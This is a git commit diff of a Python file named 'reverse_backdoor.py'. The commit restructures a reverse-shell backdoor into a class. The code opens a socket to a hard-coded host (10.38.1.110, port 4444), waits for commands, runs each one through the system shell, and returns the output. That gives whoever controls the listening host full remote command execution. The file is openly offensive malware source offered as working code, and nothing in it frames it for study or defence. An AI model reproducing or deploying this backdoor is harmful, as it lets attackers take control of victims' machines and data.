bf0e5bdcaf79ff798d196656cba3f55d1e7ee295
Raghav-45 <77260113+Raghav-45@users.noreply.github.com>
2022-08-26 23:26:26 +0530

    Made our Code Neat by using Classes

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,17 +1,21 @@
 import socket
 import subprocess
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(('10.38.1.110', 4444))
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+    
+    def run(self):
+        while True:
+            command = self.connection.recv(1024).decode()
+            command_result = self.execute_system_command(command)
+            self.connection.send(command_result)
 
-# connection.send("\n[+] Connection Established.\n".encode())
+        connection.close()
 
-while True:
-    command = connection.recv(1024).decode()
-    command_result = execute_system_command(command)
-    connection.send(command_result)
-
-connection.close()
+my_backdoor = Backdoor('10.38.1.110', 4444)
+my_backdoor.run()
